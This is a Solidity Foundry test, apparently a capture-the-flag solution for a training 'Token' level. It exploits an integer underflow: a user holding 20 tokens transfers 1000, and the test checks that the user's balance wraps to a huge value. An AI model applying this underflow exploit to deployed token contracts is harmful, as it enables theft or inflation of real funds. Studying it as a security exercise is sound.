// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../lib/forge-std/src/Test.sol";
import {console} from "../lib/forge-std/src/console.sol";
import {Token} from "../src/level-5_Token.sol";

contract TokenExploit is Test
{
  error incorrectBalance();

  Token tk;
  address owner;
  address user1;
  address user2;

  function setUp() public
  {
    owner = address(this);
    user1 = makeAddr("user1");
    user2 = makeAddr("user2");
    tk = new Token(1000);
  }

  function testExploit() public
  {
    if (tk.balanceOf(owner) != 1000)
      revert incorrectBalance();

    tk.transfer(address(user1), 20);

    if (tk.balanceOf(owner) != 980)
      revert incorrectBalance();

    vm.prank(user1);
    tk.transfer(address(user2), 1000);

    if (tk.balanceOf(user1) != 115792089237316195423570985008687907853269984665640564039457584007913129638956)
      revert incorrectBalance();
  }
}

